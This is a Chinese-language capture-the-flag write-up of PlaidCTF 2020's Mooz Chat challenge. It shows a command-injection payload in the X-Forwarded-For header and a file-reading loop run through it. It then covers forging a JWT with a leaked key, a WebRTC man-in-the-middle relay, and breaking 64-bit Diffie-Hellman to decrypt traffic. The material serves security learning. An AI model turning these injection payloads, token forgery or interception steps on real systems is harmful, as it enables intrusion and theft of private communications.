Title = "PlaidCTF2020 —— Mooz Chat "
description = "分析PlaidCTF2020上的一道中间人的题目，涉及到 Web + Re + Crypto ，比较有意思"
tags = ["CTF"]
publishtime = 2020-05-04T10:55:54
lastedittime = 2021-07-26T15:23:54
uuid = "60a7b714-e7ca-4252-94c4-e944b3a2d1b7"
-+_+-



## 前言

Part 1 (150 pts) —7 solves   pasten  A0E  Tea Deliverers

Part 2 (400 pts) — 1 solves   pasten

> Part 1: Tom Nook and Isabelle have been exchanging text messages over Mooz recently. Is Tom Nook looking for something besides bells these days?
>
> Part 2: Timmy and Tommy are now using Mooz to manage their store from a safe distance. Thankfully their video chats are end-to-end encrypted so nobody can steal their secrets.



**知识点**

- Part1: 命令注入、JWT泄露导致Token伪造

- Part2：中间人攻击获取数据包、64 bit Diffie-Hellman （使用GFNS算法分解）


相关信息
```
https://github.com/sibears/IDAGolangHelper    // IDA GO反编译插件
https://github.com/gorilla/mux  // 题目使用mux框架做路由

https://github.com/aiortc/aiortc   // 实现中间人所使用的库，aiortc的安装有点坑
https://en.wikipedia.org/wiki/General_number_field_sieve //GNFS求解离散对数算法
```



## 逆向部分

> 安装IDAGolangHelper插件
>

绑定的路由以及对应处理的handle

```go
App_handleRequest（main_handleLogin， /api/login）
App_handleRequest（main_handleRegister， /api/register）
App_handleRequest（main_handleMessage， /api/message）
App_handleRequest（main_handleHost， /api/host）
App_handleRequest（main_handleFind， /api/find）
App_handleRequest（main_handleJoin， /api/join）
App_handleRequest（main_handleJoin， /api/profile）
App_handleRequest（main_handleAvatar， /api/avatar）
App_handleRequest（main_handleadminUsers， /api/adminusers）
App_handleRequest（main_handleAdminRooms， /api/rooms）
App_handleRequest（main_handleAdminMessages， /api/messages）
```



## Part 1 命令注入、JWT泄露导致Token伪造

### 漏洞点

在`main_sandboxCmd`中，存在执行命令的功能，且命令中部分内容可控，因此可以进行命令注入  

调用顺序

```
main_handleProfile  > main_getAvatar > main_sandboxCmd
```

在 `main_getAvatar `中有两处调用 `main_sandboxCmd `，是为了对Post的avatar内容进行处理，处理完的结果会base返回给用户

第一处为

```
convert -size %dx%d xc:none -bordercolor %s -border 0 -pointsize 32 -font %s -gravity center -draw "text 0,2 %c" png:- | base64 -w0
```

第二处为

```
base64 -d | convert -comment 'uploaded by %s' - -resize %dx%d png:- | base64 -w0
```

其中第二处的 `uploaded by %s  `由 `main_getIPAddr` 获得，`main_getIPAddr  `会从请求头中的  `X-Forwarded-For `取出，而`X-Forwarded-For`是我们可控的，因此只需要在`X-Forwarded-For`中进行注入即可

```
headers = {
        "X-Forwarded-For": "1.1.1.1' | echo $(%s | base64 -w0) MAGICMAGIC '" % command,
    }
```

该操作需要一个授权用户，因此需要先进行登录获取一个合法用户的`token`再命令注入

```
>>> print(run_command("ps").decode())
PID TTY      STAT   TIME COMMAND
    1 ?        SNs    0:00 /bin/sh -c base64 -d | convert -comment 'uploaded by 1.1.1.1' | echo $(ps ax | base64 -w0) MAGICMAGIC ', 89.xxxxxxxxx' - -resize 48x48 png:- | base64 -w0
    4 ?        SN     0:00 /bin/sh -c base64 -d | convert -comment 'uploaded by 1.1.1.1' | echo $(ps ax | base64 -w0) MAGICMAGIC ', 89.xxxxxxxxx' - -resize 48x48 png:- | base64 -w0
    5 ?        SN     0:00 base64 -w0
    6 ?        SN     0:00 /bin/sh -c base64 -d | convert -comment 'uploaded by 1.1.1.1' | echo $(ps ax | base64 -w0) MAGICMAGIC ', 89.xxxxxxxxx' - -resize 48x48 png:- | base64 -w0
    7 ?        RN     0:00 ps ax
    8 ?        RN     0:00 /bin/sh -c base64 -d | convert -comment 'uploaded by 1.1.1.1' | echo $(ps ax | base64 -w0) MAGICMAGIC ', 89.xxxxxxxxx' - -resize 48x48 png:- | base64 -w0
```

通过注入`ps`命令观察到，程序应该是跑在沙箱中的，后面发现是用`nsjail`启动的

```python
>>> print(run_command("ls").decode()) 
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
start.sh
sys
tmp
usr
var
```

发现比较敏感的`start.sh`  ， 需要分段读取`start.sh`，否则太大了

```python
def read_file(file_name):
    d = b''
    index = 0
    while True:
        dd = run_command("dd if=%s bs=1 count=4096 skip=%d" % (file_name, index))
        if not dd:
            return d
        d += dd
        index += 4096
```

获取到 `start.sh` 的内容

```bash
#!/bin/bash
nginx
······
export JWT_KEY="Pl4idC7F2020"
······
```

获得`JWT_KEY`为`Pl4idC7F2020`，由题干中知道我们的目标是登录`tomnook`账户，看一下`x-chat-authorization`中的`JWT`组成

```
{
	"ipaddr": "xxx.xxx.xxx.xxx",
	"username": "xxx"
}
```

然后就可以构造出tomnook账户的token了

```
MY_IP = "your ip address"
JWT = "Pl4idC7F2020"
def get_messages():
    token = {'ipaddr': MY_IP, 'username': 'tomnook'}

    url = "https://chat.mooz.pwni.ng/api/messages"
    headers = {
        "x-chat-authorization": jwt.encode(token, JWT),
    }
    r=requests.get(url,proxies = proxies ,verify= False, headers=headers);

    assert r.status_code == 200
    return json.loads(r.text)
```

获得第一个flag

```
[······{u'to': u'tomnook', u'from': u'isabelle', u'data': u'pctf{aModestSumOfShells}'}]
```



## Part 2 中间人攻击获取数据包、64 bit Diffie-Hellman （使用GFNS算法分解）

现在已经可以登录`tomnook`账户了，通过 `/api/rooms `可以获取房间列表

```
[{"_id": "000000000000000000000000", "host": "timmy_fc87dfa4", "room": "shop_c0ddd565"}, {"_id": "000000000000000000000000", "host": "timmy_446c2ede", "room": "shop_9415eba1"}]
```

可以观察到`timmy`一直在创建房间，每一次都用一个不同的后缀创建(后缀)，查看一下前端`webpack`中`chat.js`创建房间和加入房间的逻辑

```js
const rtcConfiguration = {
    iceServers: [
        { urls: 'turn:45.79.56.244', username: 'user', credential: 'passpass' }
    ]
}
const dataChannelInit = {
    negotiated: true,
    id: 0
}
······
async chatHost(room, password) {
    this.chatReset()
    try {
        this.connection = await this.createPeerConnection()
        this.channel = this.createDataChannel(this.connection)
        const offer = await this.connection.createOffer()
        await this.connection.setLocalDescription(offer)
        const data = await this.api.host(room, offer)
        this.room = data.room
        this.peer = data.username
        this.packetizer = this.newPacketizer(true, password || '')
        await this.connection.setRemoteDescription(data.answer)
        this.connected = true
        this.sendPendingCandidates()
        this.processPeerCandidates()
    } catch (e) {
        this.chatReset()
        console.log(e)
        return false
    }
    return true
}

async chatJoin(room, password) {
    this.chatReset()
    const data = await this.api.find(room)
    this.connection = await this.createPeerConnection()
    try {
        this.channel = this.createDataChannel(this.connection)
        this.room = data.room
        this.peer = data.username
        this.packetizer = this.newPacketizer(false, password || '')
        await this.connection.setRemoteDescription(data.offer)
        const answer = await this.connection.createAnswer()
        await this.connection.setLocalDescription(answer)
        await this.api.join(this.room, answer)
        this.connected = true
        this.sendPendingCandidates()
        this.processPeerCandidates()
    } catch (e) {
        this.chatReset()
        console.log(e)
        return false
    }
    return true
}
```

`chatHost`流程大致为创建`WebRTC`连接，创建`Channel`给其他用户发送` ICE candidates`消息，这些消息可以通过 `/api/message`获得，` ICE candidates`帮助建立端对端的连接，相当于一个 `peer connection` 列表

> 建议阅读一下：https://webrtc.org/getting-started/peer-connections

同样的，`chatJoin`也会发送类似的消息

```
[{"to":"a123123","from":"timmy_eb0e6172","type":"ice","data":"{\"candidate\":\"candidate:1876313031 1 tcp 1518091519 ::1 34945 typ host tcptype passive generation 0 ufrag 83oP network-id 5\",\"sdpMid\":\"0\",\"sdpMLineIndex\":0,\"foundation\":\"1876313031\",\"component\":\"rtp\",\"priority\":1518091519,\"address\":\"::1\",\"protocol\":\"tcp\",\"port\":34945,\"type\":\"host\",\"tcpType\":\"passive\",\"relatedAddress\":null,\"relatedPort\":null,\"usernameFragment\":\"83oP\"}"}]
```

通道建立以后，消息机制如下

```
async onOpenChannel() {
        console.log('open')

        if (this.peerConnected) {
            return
        }
        this.peerConnected = true

        this.channel.onmessage = (e) => {
            const wasReady = this.packetizer.isReady()
            const ptr = Module._malloc(e.data.byteLength)
            Module.HEAP8.set(new Uint8Array(e.data), ptr)
            this.packetizer.processData(ptr, e.data.byteLength)
            Module._free(ptr)
            
            this.flushPacketizer()
            if (this.packetizer) {
                if (this.packetizer.isReady() && !wasReady) {
                    this.currentPeer = this.peer
                    if (this.options.onPeerConnected) {
                        this.options.onPeerConnected()
                    }
                }
                
                const dataType = this.packetizer.getDataType()
                if (dataType >= 0) {
                    const dataPtr = this.packetizer.getData()
                    const dataSize = this.packetizer.getDataSize()
                    const data = new Uint8Array(Module.HEAP8.slice(dataPtr, dataPtr + dataSize))

                    switch (dataType) {
                    case 0:
                        if (this.options.onVideoData) {
                            this.options.onVideoData(data)
                        }
                        break
                    case 1:
                        if (this.options.onSecureMessage) {
                            const decoder = new TextDecoder()
                            this.options.onSecureMessage(this.peer, decoder.decode(data))
                        }
                        break
                    case 255:
                        this.disconnectPeer()
                        break
                    default:
                        console.error(`Unknown peer message: type=${dataType}, data=${data}`)
                        break
                    }
                }
            }
        }
        this.flushPacketizer()
    }
    
newPacketizer(hosting, password) {
        const rand = new Uint8Array(64)
        this.options.getRandomValues(rand)
        const randPtr = Module._malloc(rand.byteLength)
        Module.HEAP8.set(rand, randPtr)
        const nonce = hosting ? this.api.username + "\n" + this.peer : this.peer + "\n" + this.api.username
        const packetizer = new Module.Connection(hosting, nonce, password, randPtr, rand.byteLength)
        Module._free(randPtr)
        return packetizer
    }    
```

其中`packetizer`的具体实现再`webassembly.wasm`里，需要逆`wasm`

> 下载`webassembly.wasm`，要通过`url`下载，不要在`f12`里下载，用`wasm2c`转成c代码，编译后丢进IDA中，具体过程就不详细说了，网上很多资料

从`wasm`中提取出以下主要的方法，这些函数名也可以从`f12`里看到

```
Connection(host, nonce, password, seed, seed_size) // the constructor
processData(self, data, size)
sendData(self, type, data, size)
isRead(self)
isError(self)
getOutput(self)
consumeOutput(self)
getData(self)
getDataSize(self)
getDataType(self)
```

其中`Packetizer`的实例化过程中用到了几个参数

- `nonce` 其构造格式为`<hosting username>\n<peer username>`
- `password ` 密钥
- `randPtr ` 随机种子

```
newPacketizer(hosting, password) {
    const rand = new Uint8Array(64)
    this.options.getRandomValues(rand)
    const randPtr = Module._malloc(rand.byteLength)
    Module.HEAP8.set(rand, randPtr)
    const nonce = hosting ? this.api.username + "\n" + this.peer : this.peer + "\n" + this.api.username
    const packetizer = new Module.Connection(hosting, nonce, password, randPtr, rand.byteLength)
    Module._free(randPtr)
    return packetizer
}
```

逆向`wasm`得到协议细节

```c
// Connection__Connection_bool__char___char___void___unsigned_int_
Connection::Connection(...) {
    this->state = 0;
    RAND_seed(seed, seed_size);
    AES_set_encrypt_key(128, SHA1(password)[:16], nonce_encryptor);
    AES_encrypt(nonce, this->encrypted_nonce, nonce_encryptor);
    AES_encrypt(nonce+16, this->encrypted_nonce+16, nonce_encryptor);
    Connection::setup(this);
}

// Connection__setup__	
Connection::setup() {
    if (hosting) {
        // Create the first packet
        dh = DH_new();
        DH_generate_parameters_ex(dh, 64, 2, 0);
        dh_param_length = i2d_DHparams(dh, dh_param);
        DH_generate_key(dh);
        dh_pub_key = DH_get_pub_key(dh);
        write_byte_to_packet(0);
        write_word_to_packet(dh_param_length);
        write_bytes_to_packet(dh_param, dh_param_length);
        dh_pub_key_bits = BN_num_bits(dh_pub_key);
        write_word_to_packet((dh_pub_key_bits+7)/8);
        write_bytes_to_packet(dh_pub_key, (dh_pub_key_bits+7)/8);
    }
}

// Connection__processData_void_const___int_
Connection::processData(this, data, data_length) {
    packet_state = read_byte_from_packet();
    // check that packet_state == this->state
    switch (packet_state) {
    case 0: // initialize connection
        if (hosting) {
            // ...
        }
        else {
            // loads the dh params from packet
            DH_generate_key(dh);
            dh_pub_key = DH_get_pub_key(dh);
            write_byte_to_packet(0);
            dh_pub_key_bits = BN_num_bits(dh_pub_key);
            write_word_to_packet((dh_pub_key_bits+7)/8);
            write_bytes_to_packet(dh_pub_key, (dh_pub_key_bits+7)/8);
            DH_compute_key(shared_key, other_pub_key, dh); // 8 bytes
            key = SHA1("0123425234234fsdfsdr3242" + shared_key)[:16];
            AES_set_encrypt_key(128, key, this->send_encryptor);
            AES_set_decrypt_key(128, key, this->recv_decryptor);
            AES_encrypt(this->encrypted_nonce, encrypted_nonce, this->send_encryptor);
            write_bytes_to_packet(encrypted_nonce, 32);
            this->state = 1;
        }
        break;
    case 1:
        // not interseting, basically change to state to 2
        ...
    case 2: // connection ready
        this->data_type = read_byte_from_packet();
        this->data_len = read_word_from_packet();
        // decrypt the data with this->recv_decryptor
    }
}
```

其中建立连接的数据包格式

**Host -> Client**:

```
BYTE - state - 0
WORD - DH parameters length
BYTE[] - DH parameters
WORD - DH public key length
BYTE[] - DH public key (for the connection key)
```

**Client-> Host**:

```
BYTE - state - 0
WORD - DH public key length
BYTE[] - DH public key (for the connection key)
BYTE[32] - encrypted nocne (with password and the connection key)
```

**Host->Clinet**:

```
BYTE - state - 1
```

**传送数据**

```
BYTE - state - 2
BYTE - data type (0 - video data, 1 - text message, 255 - disconnect)
WORD - data length
BYTE[] - data encrypted with the connection key
```

采用 64 bits 的DH来协商会话密钥，然而，64 bits DH的安全性太弱，可以使用`GNFS`算法来求解离散对数难题，如果我们能够获得`timmy`和`tommy`的通信数据，从中得到DH协商过程的参数，那么我们就可以使用`NFS`来求解离散对数

那么如何获取通信数据，就要靠中间人攻击了，说实话，`MITM`在`CTF`里还是比较少见

**中间人攻击步骤**

1. 通过` /api/rooms `找到`timmy`创建的房间
2. 通过 `/api/join/<room_name>` 加入房间 ， 与 `timmy`建立` WebRTC`连接
3. 通过 `/api/host/<room_name>` 建立与之前加入房间同名的房间，等待`tommy `加入 ，与 Tommy建立起`WebRTC`连接
4. 通信并获取通信数据包
5. 离线破解DH keys
6. 解密`AES`加密的通信数据

注意到

- 我们需要保证作为peer的中间人与作为host的中间人这两个通信的`nonce`是一样的，而`nonce`是由host和peer的`username`构成的，因此我们需要保证他们的名称相同。
- 由于是`p2p`连接，因此当第二步加入房间以后，`timmy`建立的房间信息会消失，因此后面再建立一个同名房间是没有问题的



要实现中间人攻击需要用使用支持`WebRTC`协议的库，使用 `aiortc `来实现中间人攻击，主要逻辑为

- 获取 `rooms`
- 选择某个 `timmy ` 建立的房间，比如`timmy_abcdefgh`
- 用 `tommy_abcdefgh` 的身份加入房间
- 使用 `timmy_abcdefgh`的身份再创建房间（有`JWT_KEYS`）
- 假设作为`peer`加入房间的通信为 `channel1`，作为`host`创建的房间的通信为 `channel2`
- 将`channel1`发来的数据转发给`channel2`，将`channel2`回应的数据转发给 `channel1`从而实现中间人的过程

得到数据（我已经按照协议细节用空格划分了一下）

```
H: b'00 0010 300e020900f142e55f240288a3020102 0008 3255cf918dd81e89'
C: b'00 0008 75781b2554f4927f baca5f08511f02c37ccef8515ff78c4f6b551247e6bb13841792d6b386b1f3a0'
H: b'01'
....
```

根据前面逆出来的协议，DH所使用的参数为

```
g=2
p=17384709708392335523
g**x=3627033298973761161
```



```
g**y = 8464545346795901567
```

64位的DH是可以使用 `GNFS` 算法来在合理的时间内破解的 ，全场唯一做出这道题的 `pasten` 使用了 [GDLOG](https://sourceforge.net/projects/gdlog/) 来实现求解，相关的使用过程就不在这里赘述了，求解出x的值，由于DH中shared secret的值为 `g**(x*y) mod p` 所以，我们只需要计算 `(g**y)**x mod p`就可以得到shared secret

```
In [1]: hex(pow(gy, x, p))
Out[1]: '0x7c35faf0dad285c9'
```

然后解密

```
data = b''
aes = AES.new(hashlib.sha1(b"0123425234234fsdfsdr3242" + codecs.decode("7c35faf0dad285c9", "hex")).digest()[:16])
for packet in packets:
    state = packet[0]
    if state != 2:
        continue
    ptype, length = struct.unpack(">BH", packet[1:4])
    data += aes.decrypt(packet[4:])[:length]
open("video.webm", "wb").write(data)
```

得到一段`timmy`和`tommy`之间端对端的video chat，flag在图像里

> pctf{TurnipFireSale}



## 总结

这道题目考察的能力比较综合，涉及到 Web + Re + Crypto ，有一定难度。